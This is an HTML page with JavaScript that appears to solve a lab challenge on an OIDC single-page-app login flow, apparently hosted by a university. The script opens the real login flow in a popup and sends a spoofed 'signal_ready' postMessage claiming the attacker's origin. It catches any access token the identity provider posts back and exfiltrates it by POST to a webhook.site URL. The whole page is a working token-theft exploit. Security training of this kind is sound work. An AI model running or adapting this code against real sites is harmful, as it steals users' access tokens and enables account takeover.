<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Malicious OIDC Exploit (Challenge: Checking the window’s origin)</title>
  <style>
    body { font-family: sans-serif; margin: 20px; }
    #log { margin-top: 1em; padding: 1em; background: #f8f8f8; border: 1px solid #ccc; }
  </style>
</head>
<body>
  <h1>Malicious OIDC Exploit #6</h1>
  <p>This page attempts to trick the IdP into sending tokens here by spoofing <code>signal_ready</code>.</p>
  <button id="stealBtn">Steal the Victim’s Token</button>

  <h2>Captured Tokens:</h2>
  <div id="log">(none yet)</div>

  <script>
    /*
      1) Configure the exact URL for the “Vulnerable SPA Flow” that uses:
         - sp_verifier=spa-v6 (or whichever “flow #6” is)
         - sp_id=spa-1
         - idp_verifier=spa-a6 (if needed)
         - response_type=token
         - response_mode=web_message
         - skip_prompt=1
      Adjust these parameters to match your challenge environment.
    */
    const spaUrl = `https://sp-elearning.cloud.nds.rub.de/oidc_sp/spa-app/?sp_verifier=spa-v6&sp_id=spa-1`;

    let popupRef;

    document.getElementById("stealBtn").addEventListener("click", () => {
      // 2) Open the legitimate SPA login flow in a popup.
      popupRef = window.open(spaUrl, "_blank", "width=800,height=600");

      // 3) After some delay, send a fake "signal_ready" to the popup
      //    telling it that our page is the real SPA origin.
      setTimeout(() => {
        if (popupRef) {
          console.log("[Attack] Sending fake signal_ready with attacker origin...");
          popupRef.postMessage(
            {
              jsonrpc: "2.0",
              method: "signal_ready",
              // We claim our origin is https://evil.com (or wherever we are)
              // The IdP might trust this string and send tokens back to us.
              origin: location.origin
            },
            "*"
          );
        }
      }, 2000);
    });

    // 4) Listen for tokens from the IdP (if it falls for the trick).
    window.addEventListener("message", (evt) => {
      console.log("[Attack] Received message:", evt);
      /*
        If the IdP or the SPA eventually posts the tokens to us,
        we look for something like evt.data.tokens.accessToken.value
      */
      if (evt.data && evt.data.tokens && evt.data.tokens.accessToken && evt.data.tokens.accessToken.value) {
        const stolenToken = evt.data.tokens.accessToken.value;
        document.getElementById("log").textContent = "Stolen Token: " + stolenToken;

        // Exfiltrate the token to your webhook or attacker server
        fetch("https://webhook.site/07fd3bca-c584-4cdf-8ae7-3895bf6f1ceb", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ accessToken: stolenToken })
        });
      }
    });
  </script>
</body>
</html>
